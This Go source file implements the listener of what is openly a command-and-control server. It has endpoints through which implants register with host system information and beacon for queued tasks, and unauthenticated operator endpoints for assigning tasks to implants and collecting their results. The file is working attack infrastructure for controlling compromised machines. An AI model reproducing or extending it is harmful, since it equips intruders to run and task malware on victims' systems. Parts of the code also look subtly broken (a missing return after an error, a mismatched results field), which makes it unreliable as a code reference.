package listener

import (
	"errors"
	"log"
	"net/http"
	"os"

	"asritha.dev/c2server/pkg/model"
	"github.com/gin-gonic/gin"
	"gorm.io/gorm"
)

type BeaconHTTPSRequest struct {
	ImplantID uint           `json:"implant-id"`
	Results   []model.Result `json:"results"`
}
type HTTPSListener struct {
	db                  *gorm.DB
	defaultCommProtocol CommProtocol
}

func NewHTTPS(db *gorm.DB, defaultCommProtocol CommProtocol) *HTTPSListener {
	return &HTTPSListener{
		db:                  db,
		defaultCommProtocol: defaultCommProtocol,
	}
}

func (l *HTTPSListener) Listen() {
	router := gin.Default()

	// Implant endpoints (HTTPS listener)
	implant := router.Group("/implant")
	implant.POST("/register", l.Register)
	implant.POST("/beacon", l.Beacon)

	// Operator endpoints
	operator := router.Group("/operator")
	operator.GET("/implants", l.OpListImplants)
	operator.GET("/implant/:id", l.OpGetImplant)
	operator.GET("/tasks/:implant-id", l.OpListTasks)
	operator.GET("/tasks/:implant-id/:task-id", l.OpGetTask)
	operator.POST("/tasks/:implant-id", l.OpAddTasks)
	operator.GET("/results/:implant-id", l.OpListResults)

	// TODO: remove once SSL pinning is added
	var err error
	httpsBindAddr := os.Getenv("HTTPS_BIND_ADDR")
	if httpsBindAddr[1:] == "80" {
		err = router.Run(httpsBindAddr)
	} else {
		err = router.RunTLS(":443", "cert/c2.crt", "cert/c2.key")
	}
	if err != nil {
		log.Fatalf("Failed to start HTTPS server: %v", err)
	}
}

func (l *HTTPSListener) Register(c *gin.Context) {
	var sysInfo model.SystemInfo
	if err := c.ShouldBindJSON(&sysInfo); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// Create Implant
	implant := &model.Implant{
		SystemInfo:   sysInfo,
		Dwell:        "30s",
		Jitter:       0,
		CommProtocol: l.defaultCommProtocol.String(),
	}
	if err := l.db.Create(implant).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusCreated, gin.H{
		"id":            implant.ID,
		"comm_protocol": implant.CommProtocol,
		"config": gin.H{
			"dwell":  implant.Dwell,
			"jitter": implant.Jitter,
		},
	})
}

func (l *HTTPSListener) Beacon(c *gin.Context) {
	var req BeaconHTTPSRequest
	if err := c.ShouldBind(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}

	// 1) Store results and mark tasks completed
	for _, res := range req.Results {
		if err := storeNewResult(l.db, req.ImplantID, res); err != nil {
			status := http.StatusInternalServerError
			if errors.Is(err, gorm.ErrRecordNotFound) {
				status = http.StatusBadRequest
			}
			c.JSON(status, gin.H{"error": err.Error()})
			return
		}
	}

	// 2) Fetch all pending tasks for this implant
	newTasks, err := getPendingTasksForImplant(l.db, req.ImplantID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, newTasks)
}

func (l *HTTPSListener) OpListImplants(c *gin.Context) {
	var implants []model.Implant
	if err := l.db.Preload("Tasks").Preload("Tasks.Results").Find(&implants).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"implants": implants})
}

func (l *HTTPSListener) OpGetImplant(c *gin.Context) {
	id := c.Param("id")
	var implant model.Implant
	if err := l.db.Preload("Tasks").Preload("Tasks.Results").First(&implant, id).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "implant not found"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"implant": implant})
}
func (l *HTTPSListener) OpListTasks(c *gin.Context) {
	id := c.Param("implant-id")
	var tasks []model.Task
	if err := l.db.Where("implant_id = ?", id).Preload("Results").Find(&tasks).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"tasks": tasks})
}

func (l *HTTPSListener) OpGetTask(c *gin.Context) {
	// pull both params
	implantID := c.Param("implant-id")
	taskID := c.Param("task-id")

	// fetch only if it belongs to that implant
	var task model.Task
	if err := l.db.
		Where("id = ? AND implant_id = ?", taskID, implantID).Preload("Results").
		First(&task).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "task not found"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"task": task})
}

func (l *HTTPSListener) OpAddTasks(c *gin.Context) {
	id := c.Param("implant-id")
	var implant model.Implant
	if err := l.db.
		Preload("Tasks").
		First(&implant, id).
		Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "implant not found"})
		return
	}
	var newTasks []model.Task
	if err := c.ShouldBindJSON(&newTasks); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	for i := range newTasks {
		newTasks[i].ImplantID = implant.ID
	}
	if err := l.db.Create(&newTasks).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	if err := l.db.Model(&implant).Association("Tasks").Append(newTasks); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusCreated, newTasks)
}

func (l *HTTPSListener) OpListResults(c *gin.Context) {
	id := c.Param("implant-id")

	// get all tasks for implant
	var tasks []model.Task
	if err := l.db.
		Preload("Results").
		Where("implant_id = ?", id).
		Find(&tasks).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	// collect results
	var results []model.Result
	for _, t := range tasks {
		results = append(results, t.Result)
	}
	c.JSON(http.StatusOK, gin.H{"results": results})
}
